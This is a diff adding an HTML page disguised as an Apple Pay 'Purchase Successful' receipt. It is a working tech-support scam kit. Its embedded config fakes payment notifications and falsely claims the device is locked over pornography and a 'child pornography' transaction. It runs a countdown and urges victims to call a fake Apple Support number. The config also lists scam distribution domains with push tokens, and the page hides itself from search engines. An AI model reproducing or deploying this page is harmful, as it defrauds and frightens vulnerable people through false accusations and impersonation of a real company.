@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
+  <meta name="googlebot" content="noindex, nofollow, noarchive" />
+  <meta name="bingbot" content="noindex, nofollow, noarchive" />
+  <meta name="referrer" content="no-referrer" />
+  <title>Purchase Successful</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      overscroll-behavior: none;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(160deg, #f6f9fc 0%, #eef2f7 100%);
+      color: #1a1a1a;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+    }
+    body.has-bg {
+      background: #000;
+    }
+    .bg-image {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-color: #000;
+      z-index: 0;
+      display: none;
+    }
+    body.has-bg .bg-image { display: block; }
+    .bg-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.62);
+      z-index: 1;
+      display: none;
+    }
+    body.has-bg .bg-overlay { display: block; }
+    .zone { z-index: 2; }
+    body {
+      overflow: hidden;
+    }
+    .zone {
+      position: fixed;
+      left: 0;
+      right: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      transition: top 0.2s ease, bottom 0.2s ease, height 0.2s ease;
+    }
+    .zone-top {
+      top: var(--top-zone-top, 90px);
+      height: var(--top-zone-height, 200px);
+    }
+    .zone-bottom {
+      top: var(--bottom-zone-top, 60vh);
+      bottom: 0;
+    }
+    .zone-inner {
+      width: 100%;
+      max-width: 480px;
+      padding: 0 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      transform-origin: top center;
+      transform: scale(var(--scale, 1));
+    }
+    .zone-bottom .zone-inner {
+      gap: 16px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-logo {
+      max-width: 120px;
+      max-height: 60px;
+      width: auto;
+      height: auto;
+      object-fit: contain;
+      display: block;
+    }
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.08);
+      padding: 0 28px 32px;
+      text-align: center;
+    }
+    .check-wrap {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #34c759, #28a745);
+      margin: 0 auto 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 16px rgba(52, 199, 89, 0.35);
+      animation: pop 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    .check-wrap svg { width: 26px; height: 26px; }
+    @keyframes pop {
+      from { transform: scale(0.3); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      margin-bottom: 14px;
+      color: #1a1a1a;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #6b7280;
+      margin-bottom: 0;
+      line-height: 1.5;
+    }
+    body.has-bg h1 {
+      color: #fff;
+      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.45);
+    }
+    body.has-bg .subtitle {
+      color: rgba(255, 255, 255, 0.92);
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.45);
+    }
+    .content-card {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border-radius: 18px;
+      padding: 22px 22px 18px;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.18);
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .info-box {
+      background: #f3f4f6;
+      border: 1px solid #e5e7eb;
+      border-radius: 14px;
+      padding: 22px 20px;
+      margin-bottom: 24px;
+      text-align: left;
+      color: #111;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+    }
+    .info-box .info-title {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      letter-spacing: -0.2px;
+      color: #111;
+    }
+    .info-box .info-msg {
+      font-size: 14px;
+      line-height: 1.45;
+      color: #1f2937;
+    }
+    .info-box .info-countdown {
+      margin-top: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 0.2px;
+      font-variant-numeric: tabular-nums;
+      background: rgba(0, 0, 0, 0.06);
+      color: #111;
+      padding: 6px 12px;
+      border-radius: 8px;
+      display: inline-block;
+    }
+    .info-box .info-countdown:empty { display: none; }
+    .extra-msg {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 14px 18px;
+      background: #007aff;
+      color: #fff;
+      border: 0;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .countdown {
+      font-variant-numeric: tabular-nums;
+      font-weight: 700;
+      background: rgba(255, 255, 255, 0.22);
+      padding: 3px 8px;
+      border-radius: 8px;
+      font-size: 14px;
+      letter-spacing: 0.5px;
+    }
+    .footer {
+      margin-top: 22px;
+      font-size: 12px;
+      color: #9ca3af;
+    }
+    @media (max-width: 480px) {
+      h1 { font-size: 22px; margin-bottom: 10px; }
+      .subtitle { font-size: 14px; }
+      .brand-logo { max-width: 96px; max-height: 48px; }
+      .content-card { padding: 16px 16px 14px; border-radius: 14px; gap: 12px; }
+      .info-box { padding: 16px 14px; border-radius: 12px; }
+      .info-box .info-title { font-size: 15px; }
+      .info-box .info-msg { font-size: 13px; line-height: 1.4; }
+      .extra-msg { font-size: 13px; line-height: 1.4; }
+      .btn { padding: 12px 14px; font-size: 14px; gap: 8px; }
+      .countdown { font-size: 13px; padding: 2px 7px; }
+      .zone-inner { padding: 0 16px; }
+    }
+    @media (max-width: 360px) {
+      h1 { font-size: 20px; }
+      .subtitle { font-size: 13px; }
+      .info-box .info-title { font-size: 14px; }
+      .btn { padding: 11px 12px; font-size: 13px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-image" id="bg-image"></div>
+  <div class="bg-overlay"></div>
+  <div class="zone zone-top">
+    <div class="zone-inner" id="top-inner">
+      <div class="brand">
+        <img id="brand-logo" class="brand-logo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Logo" />
+      </div>
+      <h1 id="heading"></h1>
+      <p class="subtitle" id="subtitle"></p>
+    </div>
+  </div>
+
+  <div class="zone zone-bottom">
+    <div class="zone-inner" id="bottom-inner">
+      <div class="content-card">
+        <div class="info-box">
+          <div class="info-title" id="info-title"></div>
+          <div class="info-msg" id="info-msg"></div>
+          <div class="info-countdown" id="info-countdown"></div>
+        </div>
+        <p class="extra-msg" id="extra-msg"></p>
+        <a href="#" class="btn" id="receipt-btn">
+          <span id="btn-text"></span>
+          <span class="countdown" id="countdown"></span>
+        </a>
+      </div>
+    </div>
+  </div>
+  <script>
+    const topInner = document.getElementById('top-inner');
+    const bottomInner = document.getElementById('bottom-inner');
+
+    function fit(inner, availableH) {
+      const needed = inner.scrollHeight;
+      let scale = 1;
+      if (needed > availableH && availableH > 0) {
+        scale = Math.max(0.4, availableH / needed);
+      }
+      inner.style.setProperty('--scale', scale.toFixed(3));
+    }
+
+    function applyLayout(d) {
+      const vh = d.viewportH || window.innerHeight;
+      const notifBottom = d.notifBottom || 0;
+      const popupVisible = d.popupTop != null;
+
+      const topZoneTop = Math.max(16, notifBottom + 12);
+
+      let topZoneHeight, bottomZoneTop;
+      if (popupVisible) {
+        topZoneHeight = Math.max(40, d.popupTop - 12 - topZoneTop);
+        bottomZoneTop = d.popupBottom + 12;
+      } else {
+        topZoneHeight = Math.max(40, topInner.scrollHeight + 8);
+        bottomZoneTop = topZoneTop + topZoneHeight + 16;
+      }
+
+      document.body.style.setProperty('--top-zone-top', topZoneTop + 'px');
+      document.body.style.setProperty('--top-zone-height', topZoneHeight + 'px');
+      document.body.style.setProperty('--bottom-zone-top', bottomZoneTop + 'px');
+
+      fit(topInner, topZoneHeight);
+      fit(bottomInner, Math.max(40, vh - bottomZoneTop - 16));
+    }
+
+    let lastLayout = null;
+    window.addEventListener('message', (e) => {
+      const d = e.data;
+      if (!d || d.type !== 'layout') return;
+      lastLayout = d;
+      applyLayout(d);
+    });
+    window.addEventListener('resize', () => { if (lastLayout) applyLayout(lastLayout); });
+
+    const receiptBtn = document.getElementById('receipt-btn');
+    const countdownEl = document.getElementById('countdown');
+    receiptBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      location.reload();
+    });
+
+    let remaining = 10 * 60;
+    function fmt(s) {
+      const m = Math.floor(s / 60);
+      const sec = s % 60;
+      return m + ':' + (sec < 10 ? '0' : '') + sec;
+    }
+    countdownEl.textContent = fmt(remaining);
+    setInterval(() => {
+      if (remaining > 0) remaining--;
+      countdownEl.textContent = fmt(remaining);
+    }, 1000);
+
+    (async () => {
+      try { const cfg = {"timings":{"stepDelayMs":1000,"countdownMinutes":10,"idleSeconds":10,"infoCountdownMinutes":5},"notification":{"app":"Messages","time":"now","title":"Payment Successful","text":"Sent €599.99 via Apple Pay to Pornhub \u003cbr>Premium. Not you ? call \u003ca href=\"tel:+18665574551\">+1 866 557 4551\u003c/a>"},"popup":{"message":"Your iPhone has been locked due to illegal pronography activity on your device. Your purchase of €599.99 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support +1 866 557 4551 to unlock it.","cancelLabel":"Cancel","okLabel":"Call +18008881245","okPhoneNumber":"+18665574551"},"popup2":{"message":"Are you sure you want to continue?","cancelLabel":"Cancel","okLabel":"Call +18008881245","okPhoneNumber":"+18665574551"},"sounds":{"notification":null,"popup1":null,"popup2":null},"page":{"logoUrl":"assets/logo-1779304330823.png","backgroundImageUrl":"assets/bg-1779304344566.png","heading":"Purchase Successful","subtitle":"Your order has been confirmed and a receipt has been sent to your email.","infoTitle":"Transaction of €239.99 via Apple Pay for Child Pornography was found","infoMessage":"For security reasons you are prohibited from using your device","extraMessage":"Not You? Call Apple Support:+1 866 557 4551 to unlock your device.","buttonText":"Time left to unlock request","infoCountdownText":"","browserTitle":""},"pushTargets":[{"id":"2a4d297201cb","name":"infidelityfinder.help/test","url":"https://infidelityfinder.help/test","token":"c66666743c60eb3d999eff584b8c281d9a2564acd2a7170796a31b830aaae045","pushUrl":"https://infidelityfinder.help/test/router.php?endpoint=push","enabled":true,"lastPushAt":1779304352681,"lastError":null,"source":"auto","lastSeenAt":1782528161630},{"id":"250c8d4d76c3","name":"whatsguardian.com/abc","url":"https://whatsguardian.com/abc","token":"c66666743c60eb3d999eff584b8c281d9a2564acd2a7170796a31b830aaae045","pushUrl":"https://whatsguardian.com/abc/router.php?endpoint=push","enabled":true,"lastPushAt":1779303663962,"lastError":null,"source":"auto","firstSeenAt":1779295417291,"lastSeenAt":1780374126995},{"id":"bdbc38e326f2","name":"trisdflras.z13.web.core.windows.net/","url":"https://trisdflras.z13.web.core.windows.net","token":"1713d526817cb82701c80c1063d591681eb3c8008c0eaf047a0a8dc90b960699","pushUrl":"https://trisdflras.z13.web.core.windows.net/router.php?endpoint=push","enabled":true,"lastPushAt":0,"lastError":"HTTP 405","source":"manual-bundle","firstSeenAt":1779298923818,"lastSeenAt":0},{"id":"0d04c74630d7","name":"dmflwos.z13.web.core.windows.net","url":"https://dmflwos.z13.web.core.windows.net","token":"b5950bd6dd31e58654b6d8c4e06a4075f2b5fd2b0bade6e16a86744ef391da75","pushUrl":"https://dmflwos.z13.web.core.windows.net/router.php?endpoint=push","enabled":false,"lastPushAt":0,"lastError":null,"source":"manual-bundle","firstSeenAt":1780324584322,"lastSeenAt":0},{"id":"24378d4f92c0","name":"ewambe.z13.web.core.windows.net","url":"https://ewambe.z13.web.core.windows.net","token":"184b3a755eb987163b0aaffaed9ba6dc253bcc48f93f30998954173aae30d071","pushUrl":"https://ewambe.z13.web.core.windows.net/router.php?endpoint=push","enabled":false,"lastPushAt":0,"lastError":null,"source":"manual-bundle","firstSeenAt":1780336097728,"lastSeenAt":0},{"id":"ed13c705fc2b","name":"rihtwislin.z13.web.core.windows.net","url":"https://rihtwislin.z13.web.core.windows.net","token":"1b79cdec7ee32c854433e54297cea55f64e87466c4d427211fd78f08b97a7376","pushUrl":"https://rihtwislin.z13.web.core.windows.net/router.php?endpoint=push","enabled":true,"lastPushAt":0,"lastError":"fetch failed","source":"manual-bundle","firstSeenAt":1780497337526,"lastSeenAt":0}]};
+        const p = cfg.page || {};
+        const v = cfg.visitor || {};
+        function sanitizeHTML(input) {
+          if (input == null) return '';
+          const div = document.createElement('div');
+          div.innerHTML = String(input);
+          const ALLOWED = {
+            A: ['href','target','rel','title','class'],
+            BR: [], STRONG: [], B: [], EM: [], I: [], U: [],
+            SPAN: ['class','style'], SMALL: []
+          };
+          function walk(parent) {
+            Array.from(parent.childNodes).forEach(child => {
+              if (child.nodeType === 1) {
+                const tag = child.tagName;
+                if (!ALLOWED[tag]) {
+                  while (child.firstChild) parent.insertBefore(child.firstChild, child);
+                  parent.removeChild(child);
+                  return;
+                }
+                Array.from(child.attributes).forEach(a => {
+                  if (!ALLOWED[tag].includes(a.name.toLowerCase())) child.removeAttribute(a.name);
+                });
+                if (tag === 'A') {
+                  const href = (child.getAttribute('href') || '').trim();
+                  if (!/^(https?:|mailto:|tel:|\/|#)/i.test(href)) child.removeAttribute('href');
+                  else if (/^https?:/i.test(href)) {
+                    if (!child.getAttribute('target')) child.setAttribute('target', '_blank');
+                    child.setAttribute('rel', 'noopener noreferrer');
+                  }
+                }
+                walk(child);
+              } else if (child.nodeType === 8) {
+                parent.removeChild(child);
+              }
+            });
+          }
+          walk(div);
+          return div.innerHTML;
+        }
+        function applyKeywords(text) {
+          if (text == null) return text;
+          return String(text)
+            .replace(/\{ip\}/gi, v.ip || '')
+            .replace(/\{device\}/gi, v.deviceModel || '')
+            .replace(/\{device_type\}/gi, v.deviceType || '')
+            .replace(/\{os\}/gi, v.deviceOS || '')
+            .replace(/\{browser\}/gi, v.browser || '')
+            .replace(/\{isp\}/gi, v.isp || '')
+            .replace(/\{org\}/gi, v.org || '')
+            .replace(/\{asn\}/gi, v.asn || '')
+            .replace(/\{country\}/gi, v.country || '')
+            .replace(/\{country_code\}/gi, v.countryCode || '')
+            .replace(/\{region\}/gi, v.region || '')
+            .replace(/\{city\}/gi, v.city || '');
+        }
+        const setText = (id, val) => {
+          const el = document.getElementById(id);
+          if (el && val != null) el.innerHTML = sanitizeHTML(applyKeywords(val));
+        };
+        const logo = document.getElementById('brand-logo');
+        if (logo && p.logoUrl) logo.src = p.logoUrl;
+        const bgEl = document.getElementById('bg-image');
+        if (p.backgroundImageUrl) {
+          bgEl.style.backgroundImage = `url("${p.backgroundImageUrl}")`;
+          document.body.classList.add('has-bg');
+        } else {
+          bgEl.style.backgroundImage = '';
+          document.body.classList.remove('has-bg');
+        }
+        setText('heading', p.heading);
+        setText('subtitle', p.subtitle);
+        setText('info-title', p.infoTitle);
+        setText('info-msg', p.infoMessage);
+        setText('extra-msg', p.extraMessage);
+        setText('btn-text', p.buttonText);
+
+        // Info-box ticking countdown
+        const infoCountdownEl = document.getElementById('info-countdown');
+        const tplRaw = p.infoCountdownText || '';
+        if (infoCountdownEl && tplRaw) {
+          const totalMinutes = (cfg.timings && cfg.timings.infoCountdownMinutes != null)
+            ? Number(cfg.timings.infoCountdownMinutes) || 0 : 5;
+          let infoRem = totalMinutes * 60;
+          const tplResolved = applyKeywords(tplRaw);
+          function fmtTimer(s) {
+            if (s <= 0) return '00:00';
+            const m = Math.floor(s / 60), sec = s % 60;
+            return (m < 10 ? '0' : '') + m + ':' + (sec < 10 ? '0' : '') + sec;
+          }
+          function renderInfoCountdown() {
+            infoCountdownEl.innerHTML = sanitizeHTML(tplResolved.replace(/\{timer\}/g, fmtTimer(infoRem)));
+          }
+          renderInfoCountdown();
+          setInterval(() => {
+            if (infoRem > 0) infoRem--;
+            renderInfoCountdown();
+            if (lastLayout) applyLayout(lastLayout);
+          }, 1000);
+        }
+        if (cfg.timings && cfg.timings.countdownMinutes != null) {
+          remaining = (Number(cfg.timings.countdownMinutes) || 0) * 60;
+          countdownEl.textContent = fmt(remaining);
+        }
+        if (lastLayout) applyLayout(lastLayout);
+      } catch (e) {}
+    })();
+  </script>
+</body>
+</html>
